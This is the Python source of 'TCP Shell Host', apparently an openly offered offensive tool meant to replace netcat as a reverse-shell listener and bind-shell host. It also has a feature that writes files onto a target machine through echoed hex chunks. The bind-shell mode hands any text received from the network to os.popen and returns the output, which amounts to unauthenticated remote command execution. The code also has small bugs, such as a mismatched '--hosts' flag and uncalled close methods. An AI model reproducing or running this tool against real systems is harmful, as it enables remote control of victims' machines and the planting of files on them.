#!/usr/bin/python3

"""
TCP Shell Host v1.2
Copyrigth (c) 2020 | bbryant
	This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

This script is intended as an alternative for netcat as a tcp shell host.
It adds functionality such as downloading files on the target machine without 
starting an http server and without requiring wget/curl.
"""
#Usage: python3 TCPshellhost.py -p <port> [-H <host ip>] [-b or -c]
#Examples:
#		python3 TCPshellhost.py -p 1234					| creates a listener on port 1234
#		python3 TCPshellhost.py -p 5000 -b 				| starts a bind shell listener waiting for commands on port 5000
#		python3 TCPshellhost.py -c -p 4444 -H 127.0.0.1	| connects to a bind shell listening on target 127.0.0.1 on port 4444
#
#@author bbryant
import os, re, sys
import time
import errno
import socket
import binascii

def usage():
	print("Usage: python3 "+sys.argv[0]+ " -p <port> -H <host ip> [-b xor -c]")
	print("  -h --help <void>        | Shows this screen")
	print("  -p --port <int>         | Specify port to listen on, listens on a random port if not specified")
	print("  -H --host <string>      | Specify host to connect to for bind shell")
	print("  -b 				     | Host the bind shell")
	print("  -c                      | Connect to bind shell")
	print("")
	sys.exit()


def main():

	# Parameters
	port = 0
	hosts = None

	# Socket object
	sock = None

	# Get parameters
	if len(sys.argv) == 1:
		usage()
	if "-h" in sys.argv or "--help" in sys.argv:
		usage()
	if "-p" in sys.argv:
		port = int(sys.argv[sys.argv.index('-p') + 1])
	if "--port" in sys.argv:
		port = int(sys.argv[sys.argv.index('--port') + 1])
	if "-H" in sys.argv:
		host = sys.argv[sys.argv.index('-H') + 1]
	if "--host" in sys.argv:
		host = sys.argv[sys.argv.index('--hosts') + 1]

	if "-b" in sys.argv:
		try:
			sock = Socket(port)
			sock.listen()
			shell = BindShell(sock)
			shell.interact()
			sock.close()
		except Exception:
			sock.close()


	if "-c" in sys.argv:
		try:
			sock = Socket(port)
			sock.connect(port, host)
			sock.interact()
			sock.close()
		except KeyboardInterrupt:
			sock.close()

	# Initialize a new socket and listen for a connection
	# Upon connection, create an interactive shell
	# Close the sockets once the shell is closed
	try:
		sock = Socket(port)
		sock.listen(hosts)
		shell = ReverseShell(sock)
		shell.interact()
		sock.close()
	except KeyboardInterrupt:
		sock.close()


#Establishes listening server
class Socket:

	# Global class variables
	sock = None
	conn = None
	addr = None
	port = None

	def __init__(self, port = 0):
		try:
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			self.port = port
		except socket.timeout:
			print("[!] Error: Connection timed out")
			self.close()
		except socket.error:
			print("[!] Error: Connection lost")
			self.close()

	#listen on specified port
	def listen(self, hosts=None):
		try:
			self.sock.bind(("", int(self.port)))
			self.sock.listen(1)
			self.port = self.sock.getsockname()[1]
			self.interface = self.sock.getsockname()[0]
			if self.interface == "0.0.0.0":
				print("[+] Listening on <%s:%d>" % ("0.0.0.0", self.port))
			else:
				print("[+] Listening on <%s:%d>" % (self.interface, self.port))

			self.conn, self.addr = self.sock.accept()
			self.conn.setblocking(0)
			print("[+] Got connection from <%s:%d>" % (self.addr[0], self.addr[1]))
			self.send("\n")
			self.receive(True)

			if hosts and self.addr[0] not in hosts:
				print("[-] Disconnecting host %s, not in hosts whitelist." % self.addr[0])
				print("")
				self.conn.shutdown(socket.SHUT_RDWR)
				self.listen(hosts)
		except socket.timeout:
			print("[!] Error: Connection timed out")
			self.close()
		except socket.error:
			print("[!] Error: Connection lost")
			print
			self.close()


	#connect to bind shell
	def connect(self, port = 0, host = ""):
		try:
			self.sock.connect((host,self.port))
		except Exception:
			print("[!] Error: Connection timed out")
			self.close()
		except socket.error:
			print("[!] Error: Connection lost")
			self.close()


	#interact with the bind shell
	#keeps alive
	def interact(self):
		try:
			while True:
				command = input()
				self.sock.sendall(bytes(command,'ASCII'))
				data = self.sock.recv(1024)
				sys.stdout.write(data.decode('ISO-8859-1'))		

		except socket.timeout:
			print("[!] Error: Connection timed out")
			self.close()
		except socket.error:
			print("[!] Error: Connection lost")
			print
			self.close()

	#send socket message after listener is established
	#translates conn.send to Socket.send
	#sent in chunks of 2048 bytes, change at user's need
	def send(self, message, chunksize = 2048):
		for chunk in self._chunks(message, chunksize):
			self.conn.send(bytes(chunk,'ASCII'))
		time.sleep(0.1)

	#recieve string from socket
	#again chunksize defaults to 2048 bytes
	def receive(self, print_output = False, chunksize = 2048):
		output = ""
		try:
			while True:
				data = self.conn.recv(chunksize)
				output += data.decode('ISO-8859-1')
				if print_output == True: 
					sys.stdout.write(data.decode('ISO-8859-1'))
				if not data: 
					break
		except socket.timeout:
			print("[!] Error: Connection timed out")
			self.close()
		except socket.error as err:
			exc = err.args[0]
			if exc == errno.EAGAIN or exc == errno.EWOULDBLOCK:
				return output
			else:
				print("[!] Error: Connection lost")
				self.close

	def close(self, exit = True):
		try:
			self.sock.close()
			if exit: sys.exit()
		except socket.error:
			print("[!] Error: Connection lost")

	def _chunks(self, lst, chunksize):
		for i in range(0, len(lst), chunksize):
			yield lst[i:i+chunksize]

	#used only with bind shell, instead of outputing locally sends
	#stdout to connected machine
	def bind_receive(self, print_output = False, chunksize = 1024):
		output = ""
		try:
			while True:
				data = self.conn.recv(chunksize)
				exe = os.popen(data.decode('ISO-8859-1'))
				self.conn.send(bytes(exe.read(),'ASCII'))
				if "exit" in data.decode('ISO-8859-1'):
					self.close()
				if not data: 
					break
		except socket.timeout:
			print("[!] Error: Connection timed out")
			self.close()
		except socket.error as err:
			exc = err.args[0]
			self.close

#keeps connection alive and handles shell commands
class ReverseShell:

	#Global class variables
	sock = None
	quit = False
	last_output = ""
	last_input = ""

	def __init__(self, sock):
		self.sock = sock
		self.sock.send("\n")

	#infinite loop that carries shell
	def interact(self):
		while True:
			self.input()
			self.output()
			if self.quit:
				print("[+] Closing shell...")
				break


	#gets output from shell
	#relies on Socket.recieve
	def output(self):
		self.last_output = self.sock.receive(True)


	def is_writable(self, remotefile):
		self.sock.send("touch "+remotefile+"\n")
		self.sock.send("[ -w {} ] && echo yes\n".format(remotefile))
		response = self.sock.receive(False)
		permission = re.findall("yes",response)
		if len(permission) == 2:
			return True


	#gets shell input
	#relies on Socket.send
	def input(self):
		try:
			command = input()

			#this transfers files to the target bitwise in chunks of 2048 bits sidestepping wget and curl
			#you already have a server running, why should you need to start another to host file sharing
			if command.startswith("download"):
				path = re.search(r"\s(.+)\s",command)[1]
				remotefile = re.search(r"\s(\S+)$",command)[1]
				if self.is_writable(remotefile):
					with open(path, "rb") as file:
						chunk = file.read(2048)
						while chunk:
							chunkhex = binascii.hexlify(chunk)
							hexstring = ""
							for i in range((len(str(chunkhex))//2)-1):
								hexstring += '\\x'+str(chunkhex)[2*i+2:2*i+4]
							command = "echo -n -e \'{}\' >> ".format(hexstring)+remotefile
							self.sock.send(command+"\n")
							self.sock.receive(False)
							chunk = file.read(2048)
					print("[+] File downloaded successfully")
					self.sock.send("\n")
				else:
					print("[!] dir is unwritable")
					self.sock.send("\n")

			else:
				self.sock.send(command +"\n")

		except KeyboardInterrupt:
			self.quit = True
			print("")

class BindShell:

	sock = None
	last_output = ""

	def __init__(self,sock):
		self.sock = sock

	#depends on bind_receive
	def output(self):
		self.last_output = self.sock.bind_receive()

	def interact(self):
		while True:
			self.output()


if __name__ == '__main__':
	main()